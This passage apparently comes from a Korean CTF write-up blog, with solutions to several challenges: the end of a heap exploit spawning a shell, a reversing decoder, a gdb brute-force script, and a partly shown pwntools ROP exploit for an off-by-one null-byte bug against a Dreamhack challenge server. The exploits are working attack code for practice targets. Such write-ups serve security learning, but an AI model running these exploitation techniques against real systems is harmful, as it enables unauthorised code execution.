        <span class="n">update</span><span class="p">(</span><span class="mh">0xD0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
        <span class="n">insert</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
        <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">except</span> <span class="nb">AssertionError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
</pre></table></code></div></div><h2 id="c-run---reversing">C. RUN - Reversing<a href="#c-run---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ ì•„ì£¼ ê¹”ë”í•˜ê²Œ ì¸ì½”ë”© ë£¨í‹´ë§Œ ì¡´ì¬í•œë‹¤.</p><p>ì¸ì½”ë”© ë£¨í‹´ì€ í¬ê²Œ ë³µì¡í•˜ì§€ ì•Šì•˜ê³  ì•„ë˜ì™€ ê°™ì•˜ë‹¤.</p><ol><li>ì¸í’‹ íŒŒì¼ì˜ ëª¨ë“  ë¹„íŠ¸ë¥¼ <code class="language-plaintext highlighter-rouge">char[]</code>ì— ì €ì¥í•œë‹¤.<li>í•´ë‹¹ ë°°ì—´ì„ ì²˜ìŒë¶€í„° ëŒë©´ì„œ 0ì´ ë‚˜ì˜¤ë©´ ë°˜ë³µë˜ëŠ” 0ì˜ ìˆ˜ë¥¼ ì„¼ë‹¤.<li>ë°˜ë³µë˜ëŠ” 0ì˜ ìˆ˜ì˜ ê°’ì„ cë¼ê³  í–ˆì„ ë•Œ, cì˜ ë¹„íŠ¸ ìˆ˜ ë§Œí¼ 1ì„ output ë²„í¼ì— ì¶”ê°€í•œë‹¤.<li>cë¥¼ <code class="language-plaintext highlighter-rouge">little-endian</code>ìœ¼ë¡œ output ë²„í¼ì— ì¶”ê°€í•œë‹¤.<li>ë§Œì•½ 1ì´ ë‚˜ì˜¤ë©´ output ë²„í¼ì— <code class="language-plaintext highlighter-rouge">00</code>ì„ ì¶”ê°€í•œë‹¤.<li>ë°°ì—´ì´ ëë‚œ í›„ì—”, output ë²„í¼ì˜ ê°’ì„ ì˜¨ì „í•œ ë°”ì´íŠ¸ë¡œ ì „í™˜í•˜ê¸° ìœ„í•´ 1ë¡œ íŒ¨ë”©ì„ í•´ì¤€ë‹¤.<li><code class="language-plaintext highlighter-rouge">{input file name}.enc</code> íŒŒì¼ì— ë²„í¼ë¥¼ ì¶œë ¥í•œë‹¤.</ol><p>ì´ì²˜ëŸ¼ ë‹¨ìˆœí•œ ë¹„íŠ¸ ì••ì¶• ë°©ì‹ìœ¼ë¡œ ì¸ì½”ë”©ì´ ë˜ì–´ìˆìœ¼ë¯€ë¡œ ê°„ë‹¨í•œ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì—¬ í’€ì´í•˜ì˜€ë‹¤.<br /> ê·¸ëŸ°ë° ì•„ì£¼ ì‚¬ì†Œí•œ ì‹¤ìˆ˜ë¥¼ ë°œê²¬í•˜ì§€ ëª»í•´ì„œ í‘¸ëŠ” ë°ì— ìƒê°ë³´ë‹¤ ì‹œê°„ì„ ì¢€ ë§ì´ ì¼ì—ˆë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.enc"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">t</span><span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">b</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="s">"little-endian -&gt; big-endian"</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">t</span><span class="p">)</span>

<span class="n">g</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span><span class="p">:</span><span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">except</span><span class="p">:</span><span class="k">break</span>

    <span class="k">assert</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="s">'0'</span><span class="p">)</span>

    <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">r</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">r</span>

    <span class="k">assert</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">1</span><span class="p">),(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">j</span><span class="p">],</span> <span class="n">c</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">c</span><span class="p">],</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="p">],</span> <span class="n">g</span><span class="p">)</span>

    <span class="n">g</span> <span class="o">+=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s">'1'</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">2</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">g</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="s">"big-endian -&gt; little-endian"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">g</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">r</span><span class="p">)[:</span><span class="mi">16</span><span class="p">])</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'x'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="d-nonsense---reversing">D. Nonsense - Reversing<a href="#d-nonsense---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>í¬ì§€ ì•Šì€ ë°”ì´ë„ˆë¦¬ë¥¼ ê°€ì§„ ë¦¬ë²„ì‹± ë¬¸ì œì˜€ë‹¤.</p><p>ëŒ€ì¶© ìš”ì•½í•˜ë©´, argv[1]ìœ¼ë¡œ ê¸¸ì´ê°€ 48ì¸ ì¸í’‹ì„ ë°›ê³  2ë°”ì´íŠ¸ì”© ìª¼ê°œì„œ ì•Œ ìˆ˜ ì—†ëŠ” ì—°ì‚°ì„ í•œ í›„ì— í…Œì´ë¸”ì˜ ê°’ê³¼ ë¹„êµë¥¼ í•˜ëŠ” ë°”ì´ë„ˆë¦¬ì´ë‹¤.</p><p>í•˜ì§€ë§Œ ê·¸ ì•Œ ìˆ˜ ì—†ëŠ” ì—°ì‚°ì€ ëŒ€ì¶© ë´¤ì„ ë•Œ, ì§€ì˜¥ ë¶ˆêµ¬ë©ì´ì˜ ìš©ì•” ê°™ì€ ì—´ì •ë„ ë‹¹ì¥ ë² ìŠ¤í‚¨ë¼ë¹ˆìŠ¤ ì•„ì´ìŠ¤í¬ë¦¼ì´ ë˜ë„ë¡ ìƒê²¨ ë¨¹ì–´ì„œ ë¶„ì„í•˜ê³  ì‹¶ì§€ ì•Šì•˜ë”°.</p><p>ì´ ë–„ë¬¸ì—, í•´ë‹¹ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜ì— 2 byteì”© ëŒ€ì…í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ì–»ê¸°ë¡œ í•˜ì˜€ê³ <br /> ì•µê±°ë¥¼ ì‚¬ìš©í•˜ë©´ ì¢‹ì•˜ê² ì§€ë§Œ, ì“¸ ì¤„ ëª°ë¼ì„œ gdb scriptë¥¼ í†µí•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1">#!gdb nonsense -x
</span><span class="kn">import</span> <span class="nn">gdb</span>

<span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="n">r</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">)]</span>

<span class="k">class</span> <span class="nc">bpa</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">Breakpoint</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>
        <span class="c1"># print(a,b)
</span>        <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s">"set $rdi=</span><span class="si">{</span><span class="p">(</span><span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="n">t</span><span class="o">=</span> <span class="p">[</span><span class="mh">0x00000000AB1FF171</span><span class="p">,</span> <span class="mh">0x00000000116437CE</span><span class="p">,</span> <span class="mh">0x00000000E6049FC0</span><span class="p">,</span> <span class="mh">0x00000000452929D1</span><span class="p">,</span> <span class="mh">0x0000000075A447EB</span><span class="p">,</span> <span class="mh">0x00000000C9E8CDA8</span><span class="p">,</span> <span class="mh">0x000000001CDB0144</span><span class="p">,</span> <span class="mh">0x00000000F6D4EA9C</span><span class="p">,</span> <span class="mh">0x000000001CDB0144</span><span class="p">,</span> <span class="mh">0x00000000C64319B3</span><span class="p">,</span> <span class="mh">0x00000000F2D03C54</span><span class="p">,</span> <span class="mh">0x00000000CABE6234</span><span class="p">,</span> <span class="mh">0x000000001195A6AB</span><span class="p">,</span> <span class="mh">0x00000000DC8A5604</span><span class="p">,</span> <span class="mh">0x00000000A7DC071B</span><span class="p">,</span> <span class="mh">0x000000003ED216D4</span><span class="p">,</span> <span class="mh">0x00000000D05424C0</span><span class="p">,</span> <span class="mh">0x000000001A13D5D9</span><span class="p">,</span> <span class="mh">0x00000000E8A2E464</span><span class="p">,</span> <span class="mh">0x000000008469B42D</span><span class="p">,</span> <span class="mh">0x00000000F6D4EA9C</span><span class="p">,</span> <span class="mh">0x00000000452929D1</span><span class="p">,</span> <span class="mh">0x00000000BAEBBCB0</span><span class="p">,</span> <span class="mh">0x00000000EBB57056</span><span class="p">]</span>
<span class="n">r</span><span class="o">=</span> <span class="p">[</span><span class="bp">None</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">(</span><span class="n">t</span><span class="p">)]</span>

<span class="k">class</span> <span class="nc">bpb</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">Breakpoint</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">r</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">x</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"p $rax"</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
            <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">t</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
                <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
                <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="k">try</span><span class="p">:</span><span class="n">r</span><span class="p">[(</span><span class="n">i</span> <span class="p">:</span><span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
                    <span class="k">except</span><span class="p">:</span><span class="k">break</span>
                    
        <span class="k">except</span> <span class="n">gdb</span><span class="p">.</span><span class="nb">MemoryError</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="p">:</span><span class="o">=</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7f</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="p">:</span><span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7f</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
                <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"q"</span><span class="p">)</span>
            <span class="n">b</span> <span class="o">=</span> <span class="mh">0x20</span>

        <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"set $rip=0x555555400B78"</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">False</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"file nonsense"</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"aslr off"</span><span class="p">)</span>

<span class="n">bpa</span><span class="p">(</span><span class="s">"* 0x555555400B7A"</span><span class="p">)</span>
<span class="n">bpb</span><span class="p">(</span><span class="s">"* 0x555555400b7f"</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"r asdfasdfasdfsadfasdfasdfasdfsadfasdfasdfasdfsadf"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="e-nullnull---pwnable">E. NullNull - Pwnable<a href="#e-nullnull---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ê°€ ìˆë‹¤.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">sub_13BD</span><span class="p">(){</span>
  <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp-50h] [rbp-50h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%80s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>ì•ˆì „í•˜ê²Œ ì…ë ¥ ë°›ì€ ë¬¸ìì—´ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì£¼ëŠ” ê²ƒ ê°™ì§€ë§Œ, <code class="language-plaintext highlighter-rouge">scanf</code>ì˜ <code class="language-plaintext highlighter-rouge">%s</code>ë¡œ ì…ë ¥ì„ ë°›ê¸° ë•Œë¬¸ì—<br /> <code class="language-plaintext highlighter-rouge">v1[ì…ë ¥ë°›ì€ ë¬¸ìì—´ì˜ ê¸¸ì´]</code>ì— 0ì´ ë“¤ì–´ê°€ê²Œ ë˜ì–´ì„œ <code class="language-plaintext highlighter-rouge">sfp</code>ì˜ ìµœí•˜ìœ„ ë°”ì´íŠ¸ë¥¼ 0ìœ¼ë¡œ ë®ì„ ìˆ˜ê°€ ìˆë‹¤.<br /> ë•Œë¬¸ì—, rbpì˜ ê°’ì´ ë¹„ì •ìƒì ìœ¼ë¡œ ë³€í•˜ê²Œ ë˜ê³ , í•¨ìˆ˜ì˜ ë¦¬í„´ì´ ì—°ì†ìœ¼ë¡œ 2íšŒ ì¼ì–´ë‚˜ê²Œ ë˜ë©´ ripê°€ ì˜ë„ë˜ì§€ ì•Šì€ ê³³ìœ¼ë¡œ ì´ë™í•œë‹¤.</p><p>ë˜í•œ, <code class="language-plaintext highlighter-rouge">sub_13BD</code>ì˜ ìƒìœ„ í•¨ìˆ˜ì˜ ë³€ìˆ˜ë“¤ì€ rbpë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì°¸ì¡°ë˜ê¸° ë•Œë¬¸ì—<br /> ìŠ¤íƒì˜ 8bytes read write ì¸ë±ìŠ¤ë¥¼ ì œí•œí•˜ëŠ” ê¸°ì¡´ì˜ 32ë¼ëŠ” ê°’ì´ ì €ì¥ëœ ìŠ¤íƒì˜ ì£¼ì†Œê°€ ì•„ë‹ˆë¼<br /> ë³€ì¡°ëœ rbpë¥¼ í†µí•´ ë‹¤ë¥¸ ì£¼ì†Œì˜ ê°’ì„ ì°¸ì¡°í•˜ê²Œ í•˜ë©´ì„œ ìŠ¤íƒì˜ read write ê³¼ì •ì—ì„œ oobê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.</p><p>ë”°ë¼ì„œ ì˜¬ë°”ë¥´ê²Œ ì‘ë™í•˜ëŠ” ê²½ìš°ì˜ ìˆ˜ í•˜ë‚˜ë¥¼ ì´ìš©í•˜ì—¬ ROPë¥¼ í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ ì§œê³ <br /> ì•„ë‹¤ë¦¬ê°€ ë§ì„ ë•Œê¹Œì§€ ì—°ê²°í•˜ë©´ ì‰˜ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.</p><blockquote><p>Exploit Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./nullnull_patched'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">libc</span>

<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'read(</span><span class="si">{</span><span class="n">idx</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'write(</span><span class="si">{</span><span class="n">idx</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">val</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">echo</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'echo(</span><span class="si">{</span><span class="n">val</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">re</span><span class="p">():</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'re()'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">out</span><span class="p">():</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'out()'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="c1"># p = e.process()
</span>    <span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">14359</span><span class="p">)</span>

    <span class="n">echo</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">37</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;q"</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())).</span><span class="nb">hex</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">if</span> <span class="n">base</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="n">base</span> <span class="o">-=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xf3</span>
    <span class="k">if</span> <span class="n">base</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>

    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
    <span class="n">rdx_r12</span> <span class="o">=</span> <span class="mh">0x0000000000119241</span> <span class="o">+</span> <span class="n">base</span>
    <span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x000000000002604f</span> <span class="o">+</span> <span class="n">base</span>
    <span class="n">oneshot</span> <span class="o">=</span> <span class="mh">0xe3d29</span> <span class="o">+</span> <span class="n">base</span>

    <span class="n">write</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">rdx_r12</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
